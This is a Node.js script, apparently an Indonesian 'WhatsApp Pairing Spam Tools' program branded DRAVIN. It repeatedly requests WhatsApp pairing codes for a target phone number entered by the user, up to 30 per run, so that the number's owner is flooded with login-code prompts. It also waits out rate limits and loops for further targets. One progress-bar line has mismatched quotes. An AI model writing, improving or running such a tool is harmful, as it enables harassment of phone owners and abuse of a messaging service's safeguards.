const { default: makeWASocket, useMultiFileAuthState } = require("@whiskeysockets/baileys");
const figlet = require("figlet");
const gradient = require("gradient-string");
const chalk = require("chalk").default;
const readline = require("readline");
const pino = require("pino");

const sleep = (ms, variation = 0) => new Promise(resolve => {
    setTimeout(resolve, ms + (variation ? Math.floor(Math.random() * variation) : 0));
});

const question = (text) => {
    const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
    return new Promise(resolve => rl.question(text, ans => {
        rl.close();
        resolve(ans);
    }));
};

const progressBar = async (text = "Menyiapkan koneksi", total = 15, delay = 150) => {
    for (let i = 0; i <= total; i++) {
        const filled = chalk.green("█".repeat(i));
        const empty = chalk.gray("░".repeat(total - i));
        const bar = filled + empty;
        process.stdout.write(`\r${chalk.yellow(`[⌛] ${text}`)}\n${bar}`);
        await sleep(delay);
    }
    process.stdout.write(chalk.green(" ✔️\n"));
};

const animasiGaris = async (total = 54, delay = 50) => {
    const mid = Math.floor(total / 2);

    for (let i = 0; i <= mid; i++) {
        const kiri = chalk.green("═".repeat(i));
        const kanan = chalk.green("═".repeat(i));
        const tengah = chalk.gray(" ".repeat(total - i * 2));

        const baris = kiri + tengah + kanan;
        process.stdout.write(`\r${baris}`);
        await sleep(delay);
    }

    process.stdout.write("\n");
};

const typeEffect = async (text, delay = 20) => {
    for (const char of text) {
        process.stdout.write(char);
        await sleep(delay);
    }
    process.stdout.write('\n');
};

const textingteks = async (text, delay = 10) => {
    for (const char of text) {
        process.stdout.write(char);
        await sleep(delay);
    }
    process.stdout.write('\n');
};

const showBanner = async () => {
    console.clear();
    const banner = figlet.textSync("DRAVIN", { font: "ANSI Shadow" });
    console.log(gradient.instagram.multiline(banner));
    await textingteks(chalk.magenta("[⚙️] WhatsApp Pairing Spam Tools v2 - BY DRAVIN"));
    await animasiGaris();
    await typeEffect(chalk.green("• Jangan di salah gunakan, tanggung sendiri resikonya"));
    await typeEffect(chalk.yellow("• Target hanya berlaku untuk nomor indo (62)"));
    await animasiGaris();
};

async function initConnection() {
    const { state } = await useMultiFileAuthState('./dravin_session');
    return makeWASocket({
        logger: pino({ level: "silent" }),
        printQRInTerminal: false,
        auth: state,
        connectTimeoutMs: 60000,
        defaultQueryTimeoutMs: 0,
        keepAliveIntervalMs: 10000,
        emitOwnEvents: true,
        fireInitQueries: true,
        generateHighQualityLinkPreview: true,
        syncFullHistory: true,
        markOnlineOnConnect: true,
        browser: ["Ubuntu", "Chrome", "20.0.04"]
    });
}

async function startSpam() {
    const conn = await initConnection();
    let lastNumber = '';

    while (true) {
        let nomor = '';
        if (lastNumber) {
            const reuse = await question(
                chalk.cyan('\n ┌─╼') + chalk.red('[DRAVIN') + chalk.hex('#FFA500')('〄') + chalk.red('TOOLS]') + '\n' +
                chalk.cyan(' ├──╼') + chalk.yellow('Nomor Target 62xxxxxx') + '\n' +
                chalk.cyan(' └────╼') + ' ' + chalk.red('❯') + chalk.hex('#FFA500')('❯') + chalk.blue('❯ ')
            );
            
            if (reuse.toLowerCase() === 'y') {
                nomor = lastNumber;
            }
        }
        
        if (!nomor) {
            nomor = await question(
                chalk.cyan('\n ┌─╼') + chalk.red('[DRAVIN') + chalk.hex('#FFA500')('〄') + chalk.red('TOOLS]') + '\n' +
                chalk.cyan(' ├──╼') + chalk.yellow('Nomor Target 62xxxxxx') + '\n' +
                chalk.cyan(' └────╼') + ' ' + chalk.red('❯') + chalk.hex('#FFA500')('❯') + chalk.blue('❯ ')
            );
            
            if (!/^62\d{9,13}$/.test(nomor)) {
                console.log(chalk.red("\n❌ Format nomor tidak valid. Contoh: 6281234567890"));
                continue;
            }
            lastNumber = nomor;
        }

        const jumlah = parseInt(await question(
            chalk.cyan('\n ┌─╼') + chalk.red('[DRAVIN') + chalk.hex('#FFA500')('〄') + chalk.red('TOOLS]') + '\n' +
            chalk.cyan(' ├──╼') + chalk.yellow("Jumlah Spam (1-30)") + '\n' +
            chalk.cyan(' └────╼') + ' ' + chalk.red('❯') + chalk.hex('#FFA500')('❯') + chalk.blue('❯ ')
        ));
        
        if (isNaN(jumlah) || jumlah < 1 || jumlah > 30) {
            console.log(chalk.red("\n❌ Jumlah harus antara 1 dan 30"));
            continue;
        }

        
        progressBar("Spamming ${nomor} sebanyak ${jumlah}', 10, 150);
        let sukses = 0;
        
        for (let i = 0; i < jumlah; i++) {
            try {
                const start = Date.now();
                let kode = await conn.requestPairingCode(nomor);
                kode = kode.match(/.{1,4}/g).join('-');
                const waktu = ((Date.now() - start) / 1000).toFixed(2);
                console.log(chalk.green(`[✓] ${i + 1}/${jumlah} => Kode: ${chalk.yellow(kode)} (${waktu}s)`));
                sukses++;
            } catch (err) {
                console.log(chalk.red(`[X] ${i + 1}/${jumlah} => Gagal: ${err.message}`));
                if (err.message.includes("rate limit") || err.message.includes("too many")) {
                    console.log(chalk.yellow("⚠️ Terlalu banyak permintaan, menunggu 45 detik..."));
                    await sleep(45000);
                }
            }
        }

        console.log(chalk.cyan("\n📊 Ringkasan"));
        console.log(chalk.cyan(`├─ Nomor : ${chalk.white(nomor)}`));
        console.log(chalk.cyan(`├─ Total : ${chalk.white(jumlah)}`));
        console.log(chalk.cyan(`├─ Sukses : ${chalk.green(sukses)}`));
        console.log(chalk.cyan(`└─ Gagal : ${chalk.red(jumlah - sukses)}`));

        const ulang = await question(
                chalk.cyan('\n ┌─╼') + chalk.red('[DRAVIN') + chalk.hex('#FFA500')('〄') + chalk.red('TOOLS]') + '\n' +
                chalk.cyan(' ├──╼') + chalk.magenta("🔁 Ingin spam lagi? (y/n)") + '\n' +
                chalk.cyan(' └────╼') + ' ' + chalk.red('❯') + chalk.hex('#FFA500')('❯') + chalk.blue('❯')
            );
    if (ulang.toLowerCase() !== "y") break;
    }

    console.log(chalk.green("\n✨ Terima kasih telah menggunakan Dravin Tools!"));
    process.exit(0);
}

(async () => {
    await showBanner();
    await sleep(500);
    await progressBar("Menyiapkan koneksi", 10, 150);
    await startSpam();
})();
